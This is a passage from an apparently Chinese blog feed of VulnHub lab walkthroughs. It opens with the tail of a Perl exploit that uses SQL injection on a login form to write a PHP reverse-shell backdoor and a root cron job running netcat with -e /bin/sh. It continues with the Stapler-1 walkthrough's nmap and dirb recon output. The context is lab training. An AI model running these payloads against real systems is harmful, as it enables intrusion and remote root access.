<span class="variable">$option</span>!=3)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Oups, wrong option.\nPlease, try again.\n&quot;</span>;</span><br><span class="line">goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==1)</span><br><span class="line">&#123;&amp;<span class="built_in">limit</span>&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==2)</span><br><span class="line">&#123;&amp;root&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$option</span>==3)</span><br><span class="line">&#123;&amp;quit&#125;</span><br><span class="line"> </span><br><span class="line">sub <span class="built_in">limit</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$payload</span> =</span><br><span class="line">    <span class="string">&quot;&lt;?php &quot;</span>.</span><br><span class="line">    <span class="string">&quot;system(&#x27;/bin/bash -i &gt; /dev/tcp/<span class="variable">$ip</span>/<span class="variable">$port</span> 0&lt;&amp;1 2&gt;&amp;1&#x27;);&quot;</span>.</span><br><span class="line">    <span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#Encode the payload to Hex.</span></span><br><span class="line">    <span class="variable">$payload</span> =~ s/(.)/sprintf(<span class="string">&quot;%x&quot;</span>,ord(<span class="variable">$1</span>))/eg;</span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;0x&quot;</span>.<span class="string">&quot;<span class="variable">$payload</span>&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;t3hpWn.php&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&quot;/var/www/&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n[+] Wait for reverse connection on port <span class="variable">$port</span>...\n&quot;</span>;</span><br><span class="line">    system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Uploading the backdoor to server... \n&quot;</span>;</span><br><span class="line">    <span class="variable">$junk</span>=<span class="string">&quot;&#x27;&#x27;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;&#x27; OR 1=1 UNION SELECT <span class="variable">$payload</span>,<span class="variable">$junk</span>,<span class="variable">$junk</span> INTO OUTFILE &#x27;&quot;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27; #&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$ua</span> = LWP::UserAgent-&gt;new or die;</span><br><span class="line">    <span class="variable">$req</span> = HTTP::Request-&gt;new(POST =&gt; <span class="variable">$target</span>.<span class="string">&quot;/checklogin.php&quot;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content_type(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content(<span class="string">&quot;myusername=&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&amp;mypassword=&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&amp;Submit=Login&quot;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$ua</span>-&gt;request(<span class="variable">$req</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(10);</span><br><span class="line">    <span class="variable">$int</span> = LWP::UserAgent-&gt;new() or die;</span><br><span class="line">    <span class="variable">$check</span>=<span class="variable">$int</span>-&gt;get(<span class="variable">$target</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check</span>-&gt;content =~ m/was not found/g)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[-] Failed to upload the backdoor!\n\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub root</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"># --------------------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Thanks to g0tmi1k for this local privilege escalation trick.</span></span><br><span class="line">    <span class="comment"># --------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;* * * * * root /bin/nc.traditional <span class="variable">$ip</span> <span class="variable">$port</span> -e /bin/sh &quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#Encode the payload to Hex.</span></span><br><span class="line">    <span class="variable">$payload</span> =~ s/(.)/sprintf(<span class="string">&quot;%x&quot;</span>,ord(<span class="variable">$1</span>))/eg;</span><br><span class="line">    <span class="variable">$payload</span> =<span class="string">&quot;0x&quot;</span>.<span class="string">&quot;<span class="variable">$payload</span>&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;g0tr00t&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&quot;/etc/cron.d/&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$nc</span>= <span class="string">&quot;nc -lvp <span class="variable">$port</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n[+] Wait for reverse connection on port <span class="variable">$port</span>...\n&quot;</span>;</span><br><span class="line">    system(<span class="string">&quot;xterm -e <span class="variable">$nc</span> &amp;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Uploading the backdoor to server... \n&quot;</span>;</span><br><span class="line">    <span class="variable">$junk</span>=<span class="string">&quot;&#x27;&#x27;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;&#x27; AND 1=1 union select <span class="variable">$payload</span>,<span class="variable">$junk</span>,<span class="variable">$junk</span> INTO OUTFILE &#x27;&quot;</span>.<span class="variable">$dir</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27; #&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$ua</span> = LWP::UserAgent-&gt;new or die;</span><br><span class="line">    <span class="variable">$req</span> = HTTP::Request-&gt;new(POST =&gt; <span class="variable">$target</span>.<span class="string">&quot;/checklogin.php&quot;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content_type(<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    <span class="variable">$req</span>-&gt;content(<span class="string">&quot;myusername=&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&amp;mypassword=&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&amp;Submit=Login&quot;</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$ua</span>-&gt;request(<span class="variable">$req</span>);</span><br><span class="line"> </span><br><span class="line">    sleep(60);</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Check the xterm window for the root shell... \n&quot;</span>;</span><br><span class="line">    goto menu;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub quit</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Stapler-1]</title>
    <url>/2020/04/13/Stapler-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Stapler: 1<br>发布日期：2016年6月8日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Stapler.zip</p>
<ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdGFwbGVyL1N0YXBsZXIuemlw">https://download.vulnhub.com/stapler/Stapler.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdGFwbGVyL1N0YXBsZXIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/stapler/Stapler.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">+---------------------------------------------------------+</span><br><span class="line">|                                                         |</span><br><span class="line">|                                  __..--<span class="string">&#x27;&#x27;</span>\              |</span><br><span class="line">|                          __..--<span class="string">&#x27;&#x27;</span>         \             |</span><br><span class="line">|                  __..--<span class="string">&#x27;&#x27;</span>          __..--<span class="string">&#x27;&#x27;</span>             |</span><br><span class="line">|          __..--<span class="string">&#x27;&#x27;</span>          __..--<span class="string">&#x27;&#x27;</span>       |             |</span><br><span class="line">|          \ o        __..--<span class="string">&#x27;&#x27;</span>____....----<span class="string">&quot;&quot;</span>              |</span><br><span class="line">|           \__..--<span class="string">&#x27;&#x27;</span>\                                    |</span><br><span class="line">|           |         \                                   |</span><br><span class="line">|          +----------------------------------+           |</span><br><span class="line">|          +----------------------------------+           |</span><br><span class="line">|                                                         |</span><br><span class="line">+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+</span><br><span class="line">|   名称: Stapler           |          IP: DHCP           |</span><br><span class="line">|   日期: 2016-June-08      |        目标: Get Root!      |</span><br><span class="line">|   作者: g0tmi1k           |        难度: ??? ;)         |</span><br><span class="line">+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+</span><br><span class="line">|                                                         |</span><br><span class="line">| + 一般的初级/中级虚拟机，只有几个拐点                      |</span><br><span class="line">|   + 可能会觉得容易/困难(取决于你的水平)                    |</span><br><span class="line">|   + ...还有攻击box的方式                                 |</span><br><span class="line">|                                                         |</span><br><span class="line">| + 它应该在VMware和Virtualbox上都能工作                    |</span><br><span class="line">|   + 如果更改了网络模式，请重新启动VM                       |</span><br><span class="line">|   + Fusion用户，需要在导入时重试                          |</span><br><span class="line">|                                                         |</span><br><span class="line">| + 有多种方法来执行此机器                                  |</span><br><span class="line">|   + 至少有两(2)条路径可以得到有限制的shell                 |</span><br><span class="line">|   + 至少有三种方法可以获得root访问权                       |</span><br><span class="line">|                                                         |</span><br><span class="line">| + 为2016年伦敦BsidesLondon定制                           |</span><br><span class="line">|   + Slides: https://download.vulnhub.com/media/stapler/ |</span><br><span class="line">|                                                         |</span><br><span class="line">| + Thanks g0tmi1k, nullmode, rasta_mouse &amp; superkojiman  |</span><br><span class="line">|   + …向VulnHub-CTF团队大喊一声=)        |</span><br><span class="line">|                                                         |</span><br><span class="line">+- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+</span><br><span class="line">|                                                         |</span><br><span class="line">|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |</span><br><span class="line">|                                                         |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.122</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 08:00:27:03:5A:E4 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.56.122</span></span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">20/tcp    closed ftp-data</span><br><span class="line">21/tcp    open   ftp         vsftpd 2.0.8 or later</span><br><span class="line">22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp    open   domain      dnsmasq 2.75</span><br><span class="line">80/tcp    open   http        PHP cli server 5.5 or later</span><br><span class="line">123/tcp   closed ntp</span><br><span class="line">137/tcp   closed netbios-ns</span><br><span class="line">138/tcp   closed netbios-dgm</span><br><span class="line">139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">666/tcp   open   doom?</span><br><span class="line">3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1</span><br><span class="line">12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -T4 -v --script=vuln -p 21,22,53,80,139,666,3306,12380 192.168.56.122</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">21/tcp    open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">53/tcp    open  domain      dnsmasq 2.75</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open  http        PHP cli server 5.5 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">666/tcp   open  doom?</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|     message2.jpgUT </span><br><span class="line">|     QWux</span><br><span class="line">|     <span class="string">&quot;DL[E</span></span><br><span class="line"><span class="string">|     #;3[</span></span><br><span class="line"><span class="string">|     \xf6</span></span><br><span class="line"><span class="string">|     u([r</span></span><br><span class="line"><span class="string">|     qYQq</span></span><br><span class="line"><span class="string">|     Y_?n2</span></span><br><span class="line"><span class="string">|     3&amp;M~&#123;</span></span><br><span class="line"><span class="string">|     9-a)T</span></span><br><span class="line"><span class="string">|     L&#125;AJ</span></span><br><span class="line"><span class="string">|_    .npy.9</span></span><br><span class="line"><span class="string">3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 3.X|4.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span></span><br><span class="line"><span class="string">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 4.4</span></span><br><span class="line"><span class="string">Uptime guess: 0.016 days (since Mon Apr 13 03:19:38 2020)</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">TCP Sequence Prediction: Difficulty=259 (Good luck!)</span></span><br><span class="line"><span class="string">IP ID Sequence Generation: All zeros</span></span><br><span class="line"><span class="string">Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">| smb-vuln-cve2009-3103: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2009-3103</span></span><br><span class="line"><span class="string">|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,</span></span><br><span class="line"><span class="string">|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a</span></span><br><span class="line"><span class="string">|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE</span></span><br><span class="line"><span class="string">|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,</span></span><br><span class="line"><span class="string">|           aka &quot;</span>SMBv2 Negotiation Vulnerability.<span class="string">&quot;</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-08</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line"><span class="string">|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: false</span></span><br><span class="line"><span class="string">| smb-vuln-regsvc-dos: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span></span><br><span class="line"><span class="string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span></span><br><span class="line"><span class="string">|       while working on smb-enum-sessions.</span></span><br><span class="line"><span class="string">|_</span></span><br></pre></td></tr></table></figure>

<p>dirb扫一波12380端口的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb https://192.168.56.122:12380/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Apr 13 22:11:33 2020</span><br><span class="line">URL_BASE: https://192.168.56.122:12380/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: https://192.168.56.122:12380/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/announcements/                                                                </span><br><span class="line">+ https://192.168.56.122:12380/index.html (CODE:200|SIZE:21)                                                              </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/javascript/                                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/                                                                   </span><br><span class="line">+ https://192.168.56.122:12380/robots.txt (CODE:200|SIZE:59)                                                              </span><br><span class="line">+ https://192.168.56.122:12380/server-status (CODE:403|SIZE:305)                                                          </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/announcements/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/javascript/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/javascript/jquery/                                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/doc/                                                               </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)                                               </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/index.php (CODE:200|SIZE:10332)                                                 </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/                                                                </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/libraries (CODE:403|SIZE:312)                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/                                                            </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/phpinfo.php (CODE:200|SIZE:10334)                                               </span><br><span class="line">+ https://192.168.56.122:12380/phpmyadmin/setup (CODE:401|SIZE:464)                                                       </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/sql/                                                               </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/themes/                                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/javascript/jquery/ ----</span><br><span class="line">+ https://192.168.56.122:12380/javascript/jquery/jquery (CODE:200|SIZE:284394)                                            </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/doc/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/doc/html/                                                          </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/js/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/jquery/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/js/transformations/                                                </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/locale/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/az/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/<span class="built_in">bg</span>/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ca/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/cs/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/da/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/de/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/el/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/es/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/et/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/<span class="keyword">fi</span>/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/fr/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/gl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/hu/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ia/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/id/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/it/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ja/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ko/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/lt/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/nl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pt/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/pt_BR/                                                      </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ro/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/ru/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/si/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sk/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sl/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sq/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/sv/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/tr/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/uk/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/vi/                                                         </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/zh_CN/                                                      </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/locale/zh_TW/                                                      </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/sql/ ----</span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: https://192.168.56.122:12380/phpmyadmin/templates/ ----</span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/components/                                              </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/database/                                                </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/error/                                                   </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/javascript/                                              </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/list/                                                    </span><br><span class="line">==&gt; DIRECTORY: https://192.168.56.122:12380/phpmyadmin/templates/navigation/                                              </span><br><span class="line">==&gt; DIRECTORY: 